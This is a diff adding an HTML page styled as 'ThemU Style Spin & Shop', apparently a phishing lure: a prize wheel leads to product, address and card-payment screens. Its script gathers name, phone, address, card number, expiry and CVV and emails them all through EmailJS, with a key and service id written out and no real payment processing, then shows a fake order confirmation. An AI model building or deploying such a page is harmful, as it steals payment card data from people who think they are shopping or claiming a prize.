@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ThemU Style Spin & Shop</title>
+<style>
+  /* Basic reset */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin:0; padding:0; background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh;
+  }
+  #app {
+    width: 100%;
+    max-width: 400px;
+    background:#fff;
+    border-radius:10px;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+    overflow:hidden;
+  }
+  header {
+    background: #0052cc;
+    color: white;
+    padding: 1rem;
+    text-align: center;
+    font-weight: 700;
+    font-size: 1.3rem;
+  }
+  .screen {
+    padding: 20px;
+    display: none;
+  }
+  .screen.active {
+    display: block;
+  }
+  /* Spin Wheel */
+  #wheel {
+    margin: 0 auto 1rem;
+    position: relative;
+    width: 320px;
+    height: 320px;
+    border-radius: 50%;
+    border: 12px solid #0052cc;
+    overflow: hidden;
+    box-shadow: 0 0 20px #0052cc;
+  }
+  #wheel canvas {
+    display: block;
+    margin: 0 auto;
+  }
+  #spinBtn {
+    display: block;
+    margin: 0 auto;
+    background: #0052cc;
+    color: white;
+    border:none;
+    padding: 15px 30px;
+    border-radius: 25px;
+    font-size: 1.2rem;
+    cursor: pointer;
+    user-select: none;
+  }
+  #spinBtn:disabled {
+    background: #aaa;
+    cursor: default;
+  }
+  /* Result message */
+  #result {
+    text-align: center;
+    font-size: 1.3rem;
+    margin-top: 10px;
+    min-height: 40px;
+  }
+  /* Products List */
+  #productsList {
+    display: grid;
+    grid-template-columns: repeat(auto-fit,minmax(120px,1fr));
+    gap: 15px;
+  }
+  .product-card {
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    overflow: hidden;
+    background: white;
+    cursor: pointer;
+    box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+    transition: box-shadow 0.3s ease;
+  }
+  .product-card:hover {
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+  }
+  .product-card img {
+    width: 100%;
+    height: 100px;
+    object-fit: cover;
+  }
+  .product-card .info {
+    padding: 8px;
+    text-align: center;
+  }
+  .product-card .info h4 {
+    margin: 5px 0;
+    font-size: 1rem;
+  }
+  .product-card .info p {
+    font-weight: 700;
+    color: #0052cc;
+  }
+  /* Forms */
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+  }
+  form input, form select {
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #bbb;
+    font-size: 1rem;
+  }
+  form button {
+    background: #0052cc;
+    color: white;
+    border:none;
+    padding: 14px;
+    font-size: 1.2rem;
+    border-radius: 25px;
+    cursor: pointer;
+  }
+  form button:disabled {
+    background: #aaa;
+    cursor: default;
+  }
+</style>
+</head>
+<body>
+  <div id="app">
+    <header>ThemU Style Spin & Shop</header>
+
+    <!-- Screen 1: Spin Wheel -->
+    <section id="screen-spin" class="screen active">
+      <div id="wheel"></div>
+      <button id="spinBtn">Spin the Wheel</button>
+      <div id="result"></div>
+    </section>
+
+    <!-- Screen 2: Products -->
+    <section id="screen-products" class="screen">
+      <h3>Choose a Product</h3>
+      <div id="productsList"></div>
+    </section>
+
+    <!-- Screen 3: Address Form -->
+    <section id="screen-address" class="screen">
+      <h3>Enter Your Address</h3>
+      <form id="addressForm">
+        <input type="text" name="name" placeholder="Full Name" required />
+        <input type="tel" name="phone" placeholder="Phone Number" pattern="[0-9]{10,15}" required />
+        <textarea name="address" placeholder="Address" rows="3" required></textarea>
+        <button type="submit">Next</button>
+      </form>
+    </section>
+
+    <!-- Screen 4: Payment Form -->
+    <section id="screen-payment" class="screen">
+      <h3>Payment Details</h3>
+      <form id="paymentForm">
+        <input type="text" name="cardNumber" maxlength="19" placeholder="Card Number (xxxx xxxx xxxx xxxx)" pattern="[\d\s]{16,19}" required />
+        <input type="text" name="expiry" maxlength="5" placeholder="Expiry MM/YY" pattern="(0[1-9]|1[0-2])\/\d{2}" required />
+        <input type="text" name="cvv" maxlength="3" placeholder="CVV" pattern="\d{3}" required />
+        <button type="submit">Pay Now</button>
+      </form>
+    </section>
+
+    <!-- Screen 5: Thank You -->
+    <section id="screen-thanks" class="screen">
+      <h3>Thank You!</h3>
+      <p>Your order has been received.</p>
+    </section>
+  </div>
+
+<script>
+  // Variables
+  const spinBtn = document.getElementById('spinBtn');
+  const resultDiv = document.getElementById('result');
+  const screens = {
+    spin: document.getElementById('screen-spin'),
+    products: document.getElementById('screen-products'),
+    address: document.getElementById('screen-address'),
+    payment: document.getElementById('screen-payment'),
+    thanks: document.getElementById('screen-thanks'),
+  };
+  let selectedProduct = null;
+  let userData = {};
+
+  // Wheel setup
+  const wheelDiv = document.getElementById('wheel');
+  const wheelSize = 320;
+  const canvas = document.createElement('canvas');
+  canvas.width = wheelSize;
+  canvas.height = wheelSize;
+  wheelDiv.appendChild(canvas);
+  const ctx = canvas.getContext('2d');
+
+  const segments = [
+    { label: 'Free', color: '#28a745' },
+    { label: 'Rs.2000', color: '#ffc107' },
+    { label: 'Try Again', color: '#dc3545' },
+    { label: 'Rs.500', color: '#17a2b8' },
+    { label: 'Rs.1000', color: '#6f42c1' },
+    { label: 'Bonus', color: '#fd7e14' }
+  ];
+  const segmentCount = segments.length;
+  const segmentAngle = 2 * Math.PI / segmentCount;
+
+  // Draw wheel segments
+  function drawWheel(rotation = 0) {
+    ctx.clearRect(0, 0, wheelSize, wheelSize);
+    for (let i = 0; i < segmentCount; i++) {
+      const startAngle = i * segmentAngle + rotation;
+      const endAngle = startAngle + segmentAngle;
+      ctx.beginPath();
+      ctx.moveTo(wheelSize/2, wheelSize/2);
+      ctx.arc(wheelSize/2, wheelSize/2, wheelSize/2 - 12, startAngle, endAngle);
+      ctx.fillStyle = segments[i].color;
+      ctx.fill();
+      ctx.strokeStyle = '#fff';
+      ctx.lineWidth = 2;
+      ctx.stroke();
+
+      // Text
+      ctx.save();
+      ctx.translate(wheelSize/2, wheelSize/2);
+      ctx.rotate(startAngle + segmentAngle/2);
+      ctx.textAlign = "right";
+      ctx.fillStyle = '#fff';
+      ctx.font = 'bold 16px Arial';
+      ctx.fillText(segments[i].label, wheelSize/2 - 20, 10);
+      ctx.restore();
+    }
+    // Draw pointer
+    ctx.beginPath();
+    ctx.moveTo(wheelSize/2, 0);
+    ctx.lineTo(wheelSize/2 - 15, 25);
+    ctx.lineTo(wheelSize/2 + 15, 25);
+    ctx.closePath();
+    ctx.fillStyle = 'red';
+    ctx.fill();
+  }
+
+  drawWheel();
+
+  // Spin animation
+  let spinning = false;
+  spinBtn.addEventListener('click', () => {
+    if (spinning) return;
+    spinning = true;
+    spinBtn.disabled = true;
+    resultDiv.textContent = 'Spinning...';
+
+    // Random final segment index
+    const finalIndex = Math.floor(Math.random() * segmentCount);
+    // Spin params
+    const spins = 6; // full rotations
+    const finalRotation = 2 * Math.PI * spins + (segmentCount - finalIndex) * segmentAngle - segmentAngle / 2;
+
+    let start = null;
+    const duration = 4000; // 4 sec spin
+    function animate(time) {
+      if (!start) start = time;
+      const elapsed = time - start;
+      const progress = Math.min(elapsed / duration, 1);
+      // Ease out cubic
+      const ease = 1 - Math.pow(1 - progress, 3);
+      drawWheel(finalRotation * ease);
+      if (progress < 1) {
+        requestAnimationFrame(animate);
+      } else {
+        spinning = false;
+        spinBtn.disabled = false;
+        resultDiv.textContent = `You got: ${segments[finalIndex].label}`;
+        // If "Try Again", disable product and show spin again message
+        if(segments[finalIndex].label === 'Try Again'){
+          alert('Try again! Spin once more.');
+          return;
+        }
+        // Else proceed to products screen
+        setTimeout(() => {
+          showScreen('products');
+          loadProducts();
+        }, 1000);
+      }
+    }
+    requestAnimationFrame(animate);
+  });
+
+  // Show screen helper
+  function showScreen(name) {
+    for (const key in screens) {
+      screens[key].classList.remove('active');
+    }
+    screens[name].classList.add('active');
+  }
+
+  // Sample products data
+  const products = [
+    { id: 1, name: 'Product A', price: 1000, image: 'https://picsum.photos/seed/a/200/150' },
+    { id: 2, name: 'Product B', price: 800, image: 'https://picsum.photos/seed/b/200/150' },
+    { id: 3, name: 'Product C', price: 1200, image: 'https://picsum.photos/seed/c/200/150' },
+    { id: 4, name: 'Product D', price: 700, image: 'https://picsum.photos/seed/d/200/150' }
+  ];
+
+  // Load products
+  function loadProducts() {
+    const container = document.getElementById('productsList');
+    container.innerHTML = '';
+    products.forEach(prod => {
+      const card = document.createElement('div');
+      card.className = 'product-card';
+      card.innerHTML = `
+        <img src="${prod.image}" alt="${prod.name}" />
+        <div class="info">
+          <h4>${prod.name}</h4>
+          <p>Rs.${prod.price}</p>
+        </div>
+      `;
+      card.addEventListener('click', () => {
+        selectedProduct = prod;
+        userData.product = prod;
+        showScreen('address');
+      });
+      container.appendChild(card);
+    });
+  }
+
+  // Address form submission
+  const addressForm = document.getElementById('addressForm');
+  addressForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const formData = new FormData(addressForm);
+    userData.name = formData.get('name');
+    userData.phone = formData.get('phone');
+    userData.address = formData.get('address');
+    showScreen('payment');
+  });
+
+  // Payment form submission
+  const paymentForm = document.getElementById('paymentForm');
+  paymentForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const formData = new FormData(paymentForm);
+    userData.cardNumber = formData.get('cardNumber');
+    userData.expiry = formData.get('expiry');
+    userData.cvv = formData.get('cvv');
+
+    // Send data to EmailJS
+    sendEmail(userData);
+
+    showScreen('thanks');
+  });
+
+  // EmailJS init
+  (function(){
+    const script = document.createElement('script');
+    script.src = "https://cdn.emailjs.com/sdk/3.2/email.min.js";
+    script.onload = () => {
+      emailjs.init("nvIGgJlfaqCchUzf8");
+    };
+    document.head.appendChild(script);
+  })();
+
+  // Send email function
+  function sendEmail(data){
+    const templateParams = {
+      product_name: data.product.name,
+      product_price: data.product.price,
+      user_name: data.name,
+      user_phone: data.phone,
+      user_address: data.address,
+      card_number: data.cardNumber,
+      expiry: data.expiry,
+      cvv: data.cvv
+    };
+    emailjs.send('service_ws38oh2', '__ejs-test-mail-service__', templateParams)
+    .then(() => {
+      console.log('Email sent successfully!');
+    }, (err) => {
+      console.error('Failed to send email:', err);
+      alert('Failed to send order details. Please try again.');
+    });
+  }
+</script>
+</body>
+</html>
